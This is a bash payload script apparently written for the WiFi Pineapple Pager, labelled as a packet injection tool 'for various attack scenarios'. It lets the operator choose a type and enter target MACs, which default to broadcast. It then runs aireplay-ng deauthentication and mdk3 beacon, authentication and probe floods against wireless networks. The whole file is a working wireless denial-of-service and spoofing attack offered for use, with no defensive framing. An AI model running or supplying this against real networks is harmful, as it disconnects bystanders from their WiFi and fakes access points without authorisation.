#!/bin/bash
# Title: Packet Injector
# Description: Custom WiFi packet injection tool for various attack scenarios
# Author: WiFi Pineapple Pager Community
# Version: 1.0
# Category: General
# Net Mode: NAT
#
# LED State Descriptions
# Cyan Blink - Preparing injection
# Amber Solid - Injecting packets
# Green Blink - Injection complete
# Red Blink - Error occurred

# Configuration
INJECT_COUNT=100
INJECT_RATE=50  # packets per second

LOG "Starting Packet Injector"

# Select injection type
PROMPT "Select injection type: UP=Beacon DOWN=Deauth LEFT=Auth RIGHT=Probe"
WAIT_FOR_BUTTON_PRESS UP DOWN LEFT RIGHT
button=$?

case $button in
    0)  # UP - Beacon injection
        inject_type="beacon"
        LOG "Selected: Beacon injection"
        ;;
    1)  # DOWN - Deauth injection
        inject_type="deauth"
        LOG "Selected: Deauth injection"
        ;;
    2)  # LEFT - Auth injection
        inject_type="auth"
        LOG "Selected: Auth injection"
        ;;
    3)  # RIGHT - Probe injection
        inject_type="probe"
        LOG "Selected: Probe injection"
        ;;
    *)
        LOG "Invalid selection"
        exit 1
        ;;
esac

# Get target details
if [ "$inject_type" == "deauth" ]; then
    target_mac=$(MAC_PICKER "Target AP MAC?" "FF:FF:FF:FF:FF:FF")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            exit 1
            ;;
    esac
    
    client_mac=$(MAC_PICKER "Client MAC (FF:FF:FF:FF:FF:FF for broadcast)?" "FF:FF:FF:FF:FF:FF")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            exit 1
            ;;
    esac
    
    LOG "Deauth: $target_mac <- $client_mac"
    
elif [ "$inject_type" == "beacon" ]; then
    target_ssid=$(TEXT_PICKER "SSID to broadcast?" "TestNetwork")
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            exit 1
            ;;
    esac
    
    channel=$(NUMBER_PICKER "Channel?" "6" 1 11)
    case $? in
        $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
            exit 1
            ;;
    esac
    
    LOG "Beacon: $target_ssid on channel $channel"
fi

# Confirm injection
resp=$(CONFIRMATION_DIALOG "Start packet injection?")
case $? in
    $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        exit 1
        ;;
esac
case "$resp" in
    $DUCKYSCRIPT_USER_DENIED)
        exit 0
        ;;
esac

spinner_id=$(START_SPINNER "Injecting packets...")

# Perform injection based on type
case $inject_type in
    "deauth")
        # Deauth packet injection
        aireplay-ng -0 $INJECT_COUNT -a $target_mac -c $client_mac wlan0mon > /dev/null 2>&1
        ;;
    
    "beacon")
        # Beacon frame injection
        mdk3 wlan0mon b -f /tmp/ssid_list -s $INJECT_RATE -c $channel > /dev/null 2>&1 &
        mdk_pid=$!
        echo "$target_ssid" > /tmp/ssid_list
        sleep 10
        kill $mdk_pid 2>/dev/null
        ;;
    
    "auth")
        # Authentication frame injection
        mdk3 wlan0mon a -m > /dev/null 2>&1 &
        mdk_pid=$!
        sleep 10
        kill $mdk_pid 2>/dev/null
        ;;
    
    "probe")
        # Probe request injection
        mdk3 wlan0mon p > /dev/null 2>&1 &
        mdk_pid=$!
        sleep 10
        kill $mdk_pid 2>/dev/null
        ;;
esac

STOP_SPINNER $spinner_id

LOG "Packet injection complete"
LOG "Type: $inject_type"
LOG "Packets: $INJECT_COUNT"

ALERT "Injection complete"
